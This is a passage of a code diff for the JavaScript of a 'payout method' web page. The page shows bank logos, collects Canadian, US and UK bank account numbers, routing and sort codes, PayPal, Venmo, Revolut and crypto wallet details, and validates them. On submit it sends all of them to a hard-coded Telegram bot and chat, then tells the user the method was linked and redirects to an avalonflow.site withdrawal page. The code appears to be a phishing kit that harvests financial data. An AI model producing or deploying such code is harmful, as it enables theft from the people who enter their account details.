+        const newLogo = bankLogosUS[selectedBank] || defaultLogo;
+        $logoUS.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logoUS.attr('src', newLogo);
+            void $logoUS[0].offsetWidth;
+            $logoUS.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
+    });
+
+    const bankLogosUK = {
+        "Barclays": "assets/pictures/Barclays-Logo-768x432.png",
+        "HSBC UK": "assets/pictures/HSBC-Logo-768x432.png",
+        "Lloyds Bank": "assets/pictures/Lloyds-Bank-Logo-500x281.webp",
+        "Santander UK": "assets/pictures/WA_1783360589514.jpeg",
+        "Halifax": "assets/pictures/WA_1783360607640.jpeg",
+        "TSB Bank": "assets/pictures/WA_1783360619696.jpeg",
+        "Nationwide": "assets/pictures/WA_1783378395029.jpeg",
+        "NatWest": "assets/pictures/IMG-20260706-WA0033(1).jpg"
+    };
+
+    const $logoUK = $('.payment-logoss');
+
+    $('#britishBankSelect').on('change', function () {
+        const selectedBank = $(this).val();
+        const newLogo = bankLogosUK[selectedBank] || defaultLogo;
+        $logoUK.addClass('is-hidden');
+        const tempImg = new Image();
+        tempImg.onload = function () {
+            $logoUK.attr('src', newLogo);
+            void $logoUK[0].offsetWidth;
+            $logoUK.removeClass('is-hidden');
+        };
+        tempImg.src = newLogo;
+    });
+});
+
+
+// ==========================================
+// PROFILE PICTURE LOGIC
+// ==========================================
+const photoInput = document.getElementById('photoInput');
+const profilePhoto = document.getElementById('profilePhoto');
+const avatarLabel = document.getElementById('avatarLabel');
+const DEFAULT_AVATAR = 'default-avatar.png';
+let isProcessing = false;
+
+document.addEventListener('DOMContentLoaded', () => {
+    const savedPhoto = localStorage.getItem('profilePhoto');
+    if (savedPhoto) {
+        if (profilePhoto) profilePhoto.src = savedPhoto;
+        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+    } else {
+        if (profilePhoto) profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    }
+});
+
+if (profilePhoto) {
+    profilePhoto.addEventListener('click', () => {
+        if (isProcessing) return;
+        const hasPhoto = localStorage.getItem('profilePhoto');
+        if (hasPhoto) {
+            localStorage.removeItem('profilePhoto');
+            profilePhoto.src = DEFAULT_AVATAR;
+            if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+        } else if (photoInput) {
+            photoInput.click();
+        }
+    });
+}
+
+if (photoInput) {
+    photoInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (!file || isProcessing) return;
+        isProcessing = true;
+
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            const rawImage = event.target.result;
+            const img = new Image();
+            img.src = rawImage;
+            img.onload = function() {
+                const canvas = document.createElement('canvas');
+                const size = Math.min(img.width, img.height);
+                canvas.width = size;
+                canvas.height = size;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
+                const finalImage = canvas.toDataURL('image/png');
+
+                if (profilePhoto) profilePhoto.src = finalImage;
+                localStorage.setItem('profilePhoto', finalImage);
+                if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+                photoInput.value = '';
+                setTimeout(() => { isProcessing = false; }, 300);
+            };
+        };
+        reader.readAsDataURL(file);
+    });
+}
+
+
+// ==========================================
+// FLOATING PARTICLES & NOTIFICATIONS
+// ==========================================
+window.addEventListener("DOMContentLoaded", () => {
+    const bg = document.getElementById('floating-bg');
+    if (bg) {
+        function particle() {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const s = Math.random() * 20 + 10;
+            p.style.width = s + 'px';
+            p.style.height = s + 'px';
+            p.style.left = Math.random() * 100 + 'vw';
+            p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+            bg.appendChild(p);
+            setTimeout(() => p.remove(), 30000);
+        }
+        setInterval(particle, 800);
+    }
+});
+
+const notification = document.getElementById("planNotification");
+function showNotification(message, duration = 3000) {
+    if (!notification) return;
+    notification.textContent = message;
+    notification.classList.add("show");
+    clearTimeout(notification.hideTimer);
+    notification.hideTimer = setTimeout(() => {
+        notification.classList.remove("show");
+    }, duration);
+}
+
+window.addEventListener("load", () => {
+    const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
+    const hasSavedData = Object.values(saved).some(v => v && v.toString().trim() !== "");
+    if (!hasSavedData) {
+        showNotification("Only one payout method is required");
+    }
+});
+
+
+// ==========================================
+// LOAD SAVED DATA & CARD SELECTION
+// ==========================================
+const methods = document.querySelectorAll(".payment-method");
+const saved = JSON.parse(localStorage.getItem("section3Data") || "{}");
+let preference = saved.preference || ""; 
+
+if (saved.preference) {
+  methods.forEach(method => {
+    if (method.dataset.method === saved.preference) {
+      method.classList.add("active");
+      method.querySelectorAll("input, select").forEach(el => {
+        el.style.display = "block";
+      });
+    }
+  });
+}
+
+// Restore saved fields
+if (saved.interacName && document.getElementById("interacName")) document.getElementById("interacName").value = saved.interacName;
+if (saved.interac && document.getElementById("interacInput")) document.getElementById("interacInput").value = saved.interac;
+if (saved.canadianBank && document.getElementById("canadianBankSelect")) document.getElementById("canadianBankSelect").value = saved.canadianBank;
+if (saved.accountName && document.getElementById("accountName")) document.getElementById("accountName").value = saved.accountName;
+if (saved.transitNumber && document.getElementById("transitNumber")) document.getElementById("transitNumber").value = saved.transitNumber;
+if (saved.institutionNumber && document.getElementById("institutionNumber")) document.getElementById("institutionNumber").value = saved.institutionNumber;
+if (saved.accountNumber && document.getElementById("accountNumber")) document.getElementById("accountNumber").value = saved.accountNumber;
+
+if (saved.paypalName && document.getElementById("paypalName")) document.getElementById("paypalName").value = saved.paypalName;
+if (saved.paypal && document.getElementById("paypalInput")) document.getElementById("paypalInput").value = saved.paypal;
+if (saved.cryptoName && document.getElementById("cryptoName")) document.getElementById("cryptoName").value = saved.cryptoName;
+if (saved.acuAccount && document.getElementById("acuAccount")) document.getElementById("acuAccount").value = saved.acuAccount;
+
+if (saved.venmoName && document.getElementById("venmoName")) document.getElementById("venmoName").value = saved.venmoName;
+if (saved.venmo && document.getElementById("venmoInput")) document.getElementById("venmoInput").value = saved.venmo;
+if (saved.americanBank && document.getElementById("americanBankSelect")) document.getElementById("americanBankSelect").value = saved.americanBank;
+if (saved.accountNameUs && document.getElementById("accountName-us")) document.getElementById("accountName-us").value = saved.accountNameUs;
+if (saved.transitNumberUs && document.getElementById("transitNumber-us")) document.getElementById("transitNumber-us").value = saved.transitNumberUs;
+if (saved.accountNumberUs && document.getElementById("accountNumber-us")) document.getElementById("accountNumber-us").value = saved.accountNumberUs;
+if (saved.paypalNameUs && document.getElementById("paypalName-us")) document.getElementById("paypalName-us").value = saved.paypalNameUs;
+if (saved.paypalUs && document.getElementById("paypalInput-us")) document.getElementById("paypalInput-us").value = saved.paypalUs;
+if (saved.cryptoNameUs && document.getElementById("cryptoName-us")) document.getElementById("cryptoName-us").value = saved.cryptoNameUs;
+if (saved.acuAccountUs && document.getElementById("acuAccount-us")) document.getElementById("acuAccount-us").value = saved.acuAccountUs;
+
+if (saved.revolutName && document.getElementById("revolutName")) document.getElementById("revolutName").value = saved.revolutName;
+if (saved.revolut && document.getElementById("revolutInput")) document.getElementById("revolutInput").value = saved.revolut;
+if (saved.britishBank && document.getElementById("britishBankSelect")) document.getElementById("britishBankSelect").value = saved.britishBank;
+if (saved.accountNameUk && document.getElementById("accountName-uk")) document.getElementById("accountName-uk").value = saved.accountNameUk;
+if (saved.transitNumberUk && document.getElementById("transitNumber-uk")) document.getElementById("transitNumber-uk").value = saved.transitNumberUk;
+if (saved.accountNumberUk && document.getElementById("accountNumber-uk")) document.getElementById("accountNumber-uk").value = saved.accountNumberUk;
+if (saved.paypalNameUk && document.getElementById("paypalName-uk")) document.getElementById("paypalName-uk").value = saved.paypalNameUk;
+if (saved.paypalUk && document.getElementById("paypalInput-uk")) document.getElementById("paypalInput-uk").value = saved.paypalUk;
+if (saved.cryptoNameUk && document.getElementById("cryptoName-uk")) document.getElementById("cryptoName-uk").value = saved.cryptoNameUk;
+if (saved.acuAccountUk && document.getElementById("acuAccount-uk")) document.getElementById("acuAccount-uk").value = saved.acuAccountUk;
+
+// Card Selection Handler
+methods.forEach(method => {
+  const fields = method.querySelectorAll("input, select");
+  method.onclick = () => {
+    methods.forEach(m => {
+      m.classList.remove("active");
+      m.querySelectorAll("input, select").forEach(el => {
+        el.style.display = "none";
+      });
+    });
+
+    method.classList.add("active");
+    fields.forEach(el => {
+      el.style.display = "block";
+    });
+
+    preference = method.dataset.method;
+    saveData();
+  };
+});
+
+document.querySelectorAll("input, select").forEach(input => {
+  input.addEventListener("input", saveData);
+  input.addEventListener("change", saveData);
+});
+
+
+// ==========================================
+// 3D SLIDER ENGINE
+// ==========================================
+$(document).ready(function() {
+    const container = document.querySelector('.payment-slider-viewport');
+    const cards = Array.from(document.querySelectorAll('.payment-slider-viewport .payment-container'));
+    const dotsWrapper = document.querySelector('.dots');
+
+    if (!container || cards.length === 0) return;
+
+    let isScrolling = false;
+    let isDragging = false;
+    let dragStartX = 0;
+    let scrollStart = 0;
+    let lastX = 0;
+    let velocity = 0;
+
+    function snapFeedback() {
+        if (navigator.vibrate) navigator.vibrate(10);
+    }
+
+    function generateDots() {
+        if (!dotsWrapper) return;
+        dotsWrapper.innerHTML = '';
+        cards.forEach((_, i) => {
+            const d = document.createElement('span');
+            if (i === 0) d.classList.add('active');
+            dotsWrapper.appendChild(d);
+        });
+    }
+    generateDots();
+
+    function clampScroll(left) {
+        const max = container.scrollWidth - container.clientWidth;
+        return Math.max(0, Math.min(left, max));
+    }
+
+    function update3D() {
+        const center = container.scrollLeft + container.clientWidth / 2;
+        cards.forEach(card => {
+            const cardCenter = card.offsetLeft + card.offsetWidth / 2;
+            const dist = Math.abs(center - cardCenter);
+            const maxDist = container.clientWidth;
+            const ratio = Math.min(dist / maxDist, 1);
+            const scale = 1 - (ratio * 0.12); 
+            const opacity = 1 - (ratio * 0.4);
+            const rotateY = (cardCenter < center ? 1 : -1) * ratio * 10;
+
+            card.style.transform = `
+                scale(${scale})
+                perspective(1200px)
+                rotateY(${rotateY}deg)
+            `;
+            card.style.opacity = opacity;
+        });
+    }
+
+    function setActiveCard(target) {
+        if (!target) return;
+        cards.forEach(c => c.classList.remove('active', 'inactive'));
+        target.classList.add('active');
+        cards.forEach(c => {
+            if (c !== target) c.classList.add('inactive');
+        });
+
+        if (dotsWrapper) {
+            const dots = dotsWrapper.querySelectorAll('span');
+            dots.forEach(d => d.classList.remove('active'));
+            const idx = cards.indexOf(target);
+            if (dots[idx]) dots[idx].classList.add('active');
+        }
+    }
+
+    function easeOutExpo(t) {
+        return t === 1 ? 1 : 1 - Math.pow(2, -10 * t);
+    }
+
+    function scrollToCard(index, duration = 300) {
+        if (index < 0 || index >= cards.length) return;
+        const target = cards[index];
+        const start = container.scrollLeft;
+        let dest = target.offsetLeft - container.offsetWidth/2 + target.offsetWidth/2;
+        dest = clampScroll(dest);
+        const dist = dest - start;
+        let startTime = null;
+
+        isScrolling = true;
+
+        function anim(t) {
+            if (!startTime) startTime = t;
+            const p = Math.min((t - startTime)/duration, 1);
+            const eased = easeOutExpo(p);
+            container.scrollLeft = start + dist * eased;
+            update3D();
+
+            if (p < 1) {
+                requestAnimationFrame(anim);
+            } else {
+                isScrolling = false;
+                setActiveCard(target);
+                snapFeedback();
+            }
+        }
+        requestAnimationFrame(anim);
+    }
+
+    function predictIndex() {
+        const activeIdx = cards.findIndex(c => c.classList.contains('active'));
+        const intent = (velocity * 0.25) + ((dragStartX - lastX) * 0.15);
+
+        if (Math.abs(intent) > 5) {
+            if (intent > 0) return activeIdx + 1;
+            else return activeIdx - 1;
+        }
+
+        let closest = null, min = Infinity;
+        const center = container.scrollLeft + container.clientWidth / 2;
+        cards.forEach(c => {
+            const cc = c.offsetLeft + c.offsetWidth / 2;
+            const d = Math.abs(center - cc);
+            if (d < min) { min = d; closest = c; }
+        });
+        return cards.indexOf(closest);
+    }
+
+    const leftBtn = document.querySelector('.nav-btn.left');
+    const rightBtn = document.querySelector('.nav-btn.right');
+
+    if (leftBtn) {
+        leftBtn.onclick = () => {
+            const i = cards.findIndex(c => c.classList.contains('active'));
+            if (i > 0) scrollToCard(i - 1);
+        };
+    }
+    if (rightBtn) {
+        rightBtn.onclick = () => {
+            const i = cards.findIndex(c => c.classList.contains('active'));
+            if (i < cards.length - 1) scrollToCard(i + 1);
+        };
+    }
+
+    container.addEventListener('pointerdown', e => {
+        if (isScrolling || e.target.closest('input, select, button')) return; 
+        isDragging = true;
+        dragStartX = e.clientX;
+        scrollStart = container.scrollLeft;
+        lastX = e.clientX;
+        velocity = 0;
+        container.setPointerCapture(e.pointerId);
+    });
+
+    container.addEventListener('pointermove', e => {
+        if (!isDragging) return;
+        const dx = dragStartX - e.clientX;
+        container.scrollLeft = scrollStart + dx;
+        velocity = lastX - e.clientX;
+        lastX = e.clientX;
+        update3D();
+    });
+
+    container.addEventListener('pointerup', e => {
+        if (!isDragging) return;
+        isDragging = false;
+        container.releasePointerCapture(e.pointerId);
+        scrollToCard(predictIndex());
+    });
+
+    const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
+
+    if (!savedData.preference) {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(geo => {
+                let targetIndex = 0;
+                if (geo.country_code === 'US') targetIndex = 1;
+                else if (geo.country_code === 'GB' || geo.country_code === 'UK') targetIndex = 2;
+                scrollToCard(targetIndex, 400);
+            })
+            .catch(() => scrollToCard(0, 0));
+    } else {
+        scrollToCard(0, 0);
+    }
+
+    window.addEventListener('resize', () => {
+        const active = cards.find(c => c.classList.contains('active'));
+        if (active) scrollToCard(cards.indexOf(active), 50);
+    });
+});
+
+
+// ==========================================
+// NUMBER & SORT-CODE INPUT CLEANERS
+// ==========================================
+["transitNumber", "institutionNumber", "accountNumber", "transitNumber-us", "accountNumber-us", "accountNumber-uk"].forEach(id => {
+  const input = document.getElementById(id);
+  if (input) {
+    input.addEventListener("input", () => {
+      input.value = input.value.replace(/\D/g, "");
+    });
+  }
+});
+
+// Format UK Sort Code with standard numbers/hyphens
+const ukSortInput = document.getElementById("transitNumber-uk");
+if (ukSortInput) {
+  ukSortInput.addEventListener("input", () => {
+    ukSortInput.value = ukSortInput.value.replace(/[^0-9-]/g, "");
+  });
+}
+
+
+// ==========================================
+// UNIFIED PREFERENCE & REGEX VALIDATION
+// ==========================================
+function validateCurrentPreference() {
+  if (!preference) {
+    return { valid: false, message: "Please select a payment method" };
+  }
+
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  const usernameTagRegex = /^@?[a-zA-Z0-9_]{3,30}$/;
+  const evmCryptoRegex = /^0x[a-fA-F0-9]{40}$/;
+
+  // --- CANADIAN METHODS ---
+  if (preference === "Interac e-Transfer") {
+    const name = document.getElementById("interacName")?.value.trim();
+    const email = document.getElementById("interacInput")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!email || !emailRegex.test(email)) return { valid: false, message: "Please enter a valid Interac e-Transfer email address" };
+    return { valid: true };
+  }
+
+  if (preference === "Canadian Bank Transfer") {
+    const bank = document.getElementById("canadianBankSelect")?.value.trim();
+    const name = document.getElementById("accountName")?.value.trim();
+    const transit = document.getElementById("transitNumber")?.value.trim();
+    const inst = document.getElementById("institutionNumber")?.value.trim();
+    const acc = document.getElementById("accountNumber")?.value.trim();
+
+    if (!bank) return { valid: false, message: "Please select your Canadian Bank" };
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!transit || !/^\d{5}$/.test(transit)) return { valid: false, message: "Transit Number must be exactly 5 digits" };
+    if (!inst || !/^\d{3}$/.test(inst)) return { valid: false, message: "Institution Number must be exactly 3 digits" };
+    if (!acc || !/^\d{7,12}$/.test(acc)) return { valid: false, message: "Account Number must be between 7 and 12 digits" };
+    return { valid: true };
+  }
+
+  if (preference === "Canada PayPal") {
+    const name = document.getElementById("paypalName")?.value.trim();
+    const email = document.getElementById("paypalInput")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!email || !emailRegex.test(email)) return { valid: false, message: "Please enter a valid PayPal email address" };
+    return { valid: true };
+  }
+
+  if (preference === "Canada USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName")?.value.trim();
+    const addr = document.getElementById("acuAccount")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!addr || !evmCryptoRegex.test(addr)) return { valid: false, message: "Please enter a valid ERC-20 wallet address starting with 0x (42 characters)" };
+    return { valid: true };
+  }
+
+  // --- AMERICAN METHODS ---
+  if (preference === "Venmo") {
+    const name = document.getElementById("venmoName")?.value.trim();
+    const user = document.getElementById("venmoInput")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!user || !usernameTagRegex.test(user)) return { valid: false, message: "Please enter a valid Venmo username (e.g. @username)" };
+    return { valid: true };
+  }
+
+  if (preference === "American Bank Transfer") {
+    const bank = document.getElementById("americanBankSelect")?.value.trim();
+    const name = document.getElementById("accountName-us")?.value.trim();
+    const routing = document.getElementById("transitNumber-us")?.value.trim();
+    const acc = document.getElementById("accountNumber-us")?.value.trim();
+
+    if (!bank) return { valid: false, message: "Please select your US Bank" };
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!routing || !/^\d{9}$/.test(routing)) return { valid: false, message: "Routing Number must be exactly 9 digits" };
+    if (!acc || !/^\d{4,17}$/.test(acc)) return { valid: false, message: "Account Number must be between 4 and 17 digits" };
+    return { valid: true };
+  }
+
+  if (preference === "US PayPal") {
+    const name = document.getElementById("paypalName-us")?.value.trim();
+    const email = document.getElementById("paypalInput-us")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!email || !emailRegex.test(email)) return { valid: false, message: "Please enter a valid PayPal email address" };
+    return { valid: true };
+  }
+
+  if (preference === "US USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName-us")?.value.trim();
+    const addr = document.getElementById("acuAccount-us")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!addr || !evmCryptoRegex.test(addr)) return { valid: false, message: "Please enter a valid ERC-20 wallet address starting with 0x (42 characters)" };
+    return { valid: true };
+  }
+
+  // --- BRITISH METHODS ---
+  if (preference === "Revolut") {
+    const name = document.getElementById("revolutName")?.value.trim();
+    const revtag = document.getElementById("revolutInput")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!revtag || !usernameTagRegex.test(revtag)) return { valid: false, message: "Please enter a valid Revtag (e.g. @username)" };
+    return { valid: true };
+  }
+
+  if (preference === "British Bank Transfer") {
+    const bank = document.getElementById("britishBankSelect")?.value.trim();
+    const name = document.getElementById("accountName-uk")?.value.trim();
+    const sortCodeRaw = document.getElementById("transitNumber-uk")?.value.trim() || "";
+    const sortCodeClean = sortCodeRaw.replace(/\D/g, "");
+    const acc = document.getElementById("accountNumber-uk")?.value.trim();
+
+    if (!bank) return { valid: false, message: "Please select your UK Bank" };
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!sortCodeClean || sortCodeClean.length !== 6) return { valid: false, message: "Sort Code must be exactly 6 digits (e.g. 12-34-56)" };
+    if (!acc || !/^\d{8}$/.test(acc)) return { valid: false, message: "Account Number must be exactly 8 digits" };
+    return { valid: true };
+  }
+
+  if (preference === "UK PayPal") {
+    const name = document.getElementById("paypalName-uk")?.value.trim();
+    const email = document.getElementById("paypalInput-uk")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!email || !emailRegex.test(email)) return { valid: false, message: "Please enter a valid PayPal email address" };
+    return { valid: true };
+  }
+
+  if (preference === "UK USDT / USDC ERC20") {
+    const name = document.getElementById("cryptoName-uk")?.value.trim();
+    const addr = document.getElementById("acuAccount-uk")?.value.trim();
+    if (!name) return { valid: false, message: "Please enter the Account Holder Name" };
+    if (!addr || !evmCryptoRegex.test(addr)) return { valid: false, message: "Please enter a valid ERC-20 wallet address starting with 0x (42 characters)" };
+    return { valid: true };
+  }
+
+  return { valid: false, message: "Invalid payment configuration selected" };
+}
+
+
+// ==========================================
+// MESSAGE BUILDER & TELEGRAM DISPATCH
+// ==========================================
+function buildMessage(data) {
+  return `
+📩 New Form Submission:
+
+Preference: ${data.preference || "-"}
+
+--- CANADA ---
+Interac Name: ${data.interacName || "-"}
+Interac Email: ${data.interac || "-"}
+Bank Name (CA): ${data.canadianBank || "-"}
+Account Name (CA): ${data.accountName || "-"}
+Transit Number (CA): ${data.transitNumber || "-"}
+Institution Number (CA): ${data.institutionNumber || "-"}
+Account Number (CA): ${data.accountNumber || "-"}
+PayPal Name (CA): ${data.paypalName || "-"}
+PayPal Email (CA): ${data.paypal || "-"}
+Crypto Name (CA): ${data.cryptoName || "-"}
+ERC20 Wallet (CA): ${data.acuAccount || "-"}
+
+--- UNITED STATES ---
+Venmo Name: ${data.venmoName || "-"}
+Venmo Username: ${data.venmo || "-"}
+Bank Name (US): ${data.americanBank || "-"}
+Account Name (US): ${data.accountNameUs || "-"}
+Routing Number (US): ${data.transitNumberUs || "-"}
+Account Number (US): ${data.accountNumberUs || "-"}
+PayPal Name (US): ${data.paypalNameUs || "-"}
+PayPal Email (US): ${data.paypalUs || "-"}
+Crypto Name (US): ${data.cryptoNameUs || "-"}
+ERC20 Wallet (US): ${data.acuAccountUs || "-"}
+
+--- UNITED KINGDOM ---
+Revolut Name: ${data.revolutName || "-"}
+Revolut Revtag: ${data.revolut || "-"}
+Bank Name (UK): ${data.britishBank || "-"}
+Account Name (UK): ${data.accountNameUk || "-"}
+Sort Code (UK): ${data.transitNumberUk || "-"}
+Account Number (UK): ${data.accountNumberUk || "-"}
+PayPal Name (UK): ${data.paypalNameUk || "-"}
+PayPal Email (UK): ${data.paypalUk || "-"}
+Crypto Name (UK): ${data.cryptoNameUk || "-"}
+ERC20 Wallet (UK): ${data.acuAccountUk || "-"}
+`;
+}
+
+const BOT_TOKEN = "8663093122:AAHdCgL3yFq3Ew46kkU84tiQG3BNap5yK_M";
+const CHAT_ID = "-1003913850436";
+
+function sendToTelegram(data) {
+  const message = buildMessage(data);
+
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
+}
+
+
+// ==========================================
+// SAVE DATA FUNCTION
+// ==========================================
+function saveData() {
+    const savedData = JSON.parse(localStorage.getItem("section3Data") || "{}");
+
+    savedData.preference = preference;
+
+    // CA
+    savedData.interacName = document.getElementById("interacName")?.value || "";
+    savedData.interac = document.getElementById("interacInput")?.value || "";
+    savedData.canadianBank = document.getElementById("canadianBankSelect")?.value || "";
+    savedData.accountName = document.getElementById("accountName")?.value || "";
+    savedData.transitNumber = document.getElementById("transitNumber")?.value || "";
+    savedData.institutionNumber = document.getElementById("institutionNumber")?.value || "";
+    savedData.accountNumber = document.getElementById("accountNumber")?.value || "";
+    savedData.paypalName = document.getElementById("paypalName")?.value || "";
+    savedData.paypal = document.getElementById("paypalInput")?.value || "";
+    savedData.cryptoName = document.getElementById("cryptoName")?.value || "";
+    savedData.acuAccount = document.getElementById("acuAccount")?.value || "";
+
+    // US
+    savedData.venmoName = document.getElementById("venmoName")?.value || "";
+    savedData.venmo = document.getElementById("venmoInput")?.value || "";
+    savedData.americanBank = document.getElementById("americanBankSelect")?.value || "";
+    savedData.accountNameUs = document.getElementById("accountName-us")?.value || "";
+    savedData.transitNumberUs = document.getElementById("transitNumber-us")?.value || "";
+    savedData.accountNumberUs = document.getElementById("accountNumber-us")?.value || "";
+    savedData.paypalNameUs = document.getElementById("paypalName-us")?.value || "";
+    savedData.paypalUs = document.getElementById("paypalInput-us")?.value || "";
+    savedData.cryptoNameUs = document.getElementById("cryptoName-us")?.value || "";
+    savedData.acuAccountUs = document.getElementById("acuAccount-us")?.value || "";
+
+    // UK
+    savedData.revolutName = document.getElementById("revolutName")?.value || "";
+    savedData.revolut = document.getElementById("revolutInput")?.value || "";
+    savedData.britishBank = document.getElementById("britishBankSelect")?.value || "";
+    savedData.accountNameUk = document.getElementById("accountName-uk")?.value || "";
+    savedData.transitNumberUk = document.getElementById("transitNumber-uk")?.value || "";
+    savedData.accountNumberUk = document.getElementById("accountNumber-uk")?.value || "";
+    savedData.paypalNameUk = document.getElementById("paypalName-uk")?.value || "";
+    savedData.paypalUk = document.getElementById("paypalInput-uk")?.value || "";
+    savedData.cryptoNameUk = document.getElementById("cryptoName-uk")?.value || "";
+    savedData.acuAccountUk = document.getElementById("acuAccount-uk")?.value || "";
+
+    let exactTransferMethodName = preference;
+    let selectedRegion = "CA";
+
+    const activeCard = document.querySelector(".payment-method.active");
+    if (activeCard) {
+        const region = activeCard.dataset.region;
+        if (region === "usa") { 
+            selectedRegion = "US";
+            if (preference === "American Bank Transfer") exactTransferMethodName = savedData.americanBank || "American Bank Transfer";
+            else if (preference === "Venmo") exactTransferMethodName = "Venmo";
+        } else if (region === "canada") {
+            selectedRegion = "CA";
+            if (preference === "Canadian Bank Transfer") exactTransferMethodName = savedData.canadianBank || "Canadian Bank Transfer";
+        } else if (region === "uk") {
+            selectedRegion = "UK";
+            if (preference === "British Bank Transfer") exactTransferMethodName = savedData.britishBank || "British Bank Transfer";
+        }
+    }
+
+    localStorage.setItem("av_selected_region", selectedRegion);
+    localStorage.setItem("av_selected_method_title", exactTransferMethodName);
+    localStorage.setItem("section3Data", JSON.stringify(savedData));
+}
+
+
+// ==========================================
+// MAIN SUBMIT / WITHDRAW HANDLER
+// ==========================================
+document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
+
+  const validation = validateCurrentPreference();
+
+  if (!validation.valid) {
+    showNotification(validation.message, 6000);
+    return; 
+  }
+
+  showNotification("Verifying payout information...", 2500);
+
+  const data = {
+    preference,
+    // CA
+    interacName: document.getElementById("interacName")?.value.trim(),
+    interac: document.getElementById("interacInput")?.value.trim(),
+    canadianBank: document.getElementById("canadianBankSelect")?.value.trim(),
+    accountName: document.getElementById("accountName")?.value.trim(),
+    transitNumber: document.getElementById("transitNumber")?.value.trim(),
+    institutionNumber: document.getElementById("institutionNumber")?.value.trim(),
+    accountNumber: document.getElementById("accountNumber")?.value.trim(),
+    paypalName: document.getElementById("paypalName")?.value.trim(),
+    paypal: document.getElementById("paypalInput")?.value.trim(),
+    cryptoName: document.getElementById("cryptoName")?.value.trim(),
+    acuAccount: document.getElementById("acuAccount")?.value.trim(),
+
+    // US
+    venmoName: document.getElementById("venmoName")?.value.trim(),
+    venmo: document.getElementById("venmoInput")?.value.trim(),
+    americanBank: document.getElementById("americanBankSelect")?.value.trim(),
+    accountNameUs: document.getElementById("accountName-us")?.value.trim(),
+    transitNumberUs: document.getElementById("transitNumber-us")?.value.trim(),
+    accountNumberUs: document.getElementById("accountNumber-us")?.value.trim(),
+    paypalNameUs: document.getElementById("paypalName-us")?.value.trim(),
+    paypalUs: document.getElementById("paypalInput-us")?.value.trim(),
+    cryptoNameUs: document.getElementById("cryptoName-us")?.value.trim(),
+    acuAccountUs: document.getElementById("acuAccount-us")?.value.trim(),
+
+    // UK
+    revolutName: document.getElementById("revolutName")?.value.trim(),
+    revolut: document.getElementById("revolutInput")?.value.trim(),
+    britishBank: document.getElementById("britishBankSelect")?.value.trim(),
+    accountNameUk: document.getElementById("accountName-uk")?.value.trim(),
+    transitNumberUk: document.getElementById("transitNumber-uk")?.value.trim(),
+    accountNumberUk: document.getElementById("accountNumber-uk")?.value.trim(),
+    paypalNameUk: document.getElementById("paypalName-uk")?.value.trim(),
+    paypalUk: document.getElementById("paypalInput-uk")?.value.trim(),
+    cryptoNameUk: document.getElementById("cryptoName-uk")?.value.trim(),
+    acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim()
+  };
+
+  localStorage.setItem("section3Data", JSON.stringify(data));
+
+  try {
+    await sendToTelegram(data);
+    showNotification("Payout method linked successfully", 3000);
+
+    setTimeout(() => {
+      window.location.href = "https://membership.avalonflow.site/withdraw";
+    }, 1500);
+
+  } catch (err) {
+    console.error("Telegram send failed:", err);
+    showNotification("Failed to link payout method. Please try again", 5000);
+  }
+});
+
+
+
+/* --------------------------
+FINGERPRINT
+-------------------------- */
+
+function getFingerprint() {
+  return btoa(
+    navigator.userAgent +
+    screen.width + screen.height +
+    navigator.language
+  );
+}
+
+
+/* ---------- Auto-Logout After 15 Minutes of Inactivity ---------- */
+const AUTO_LOGOUT_TIME = 15 * 60 * 1000; // 15 minutes in milliseconds
+let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+
+function resetLogoutTimer() {
+    clearTimeout(logoutTimer);
+    logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+}
+
+// Reset timer on user activity
+["mousemove", "keydown", "scroll", "click", "touchstart"].forEach(event => {
+    window.addEventListener(event, resetLogoutTimer, { passive: true });
+});
+});
+// Remove the listener that fires immediately
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "Preferred Wallet" 
+    }, "*");
+
+// 1. Grab the user context from the current URL right away
+const urlParams = new URLSearchParams(window.location.search);
+const userParam = urlParams.get('user');
+
+// 2. Build the destination path dynamically
+
+const destinationPath = userParam 
+    ? `/withdrawal?user=${encodeURIComponent(userParam)}` 
+    : '/withdrawal';
+
+// 3. Trigger your existing update mechanism with the updated path
+window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
+});
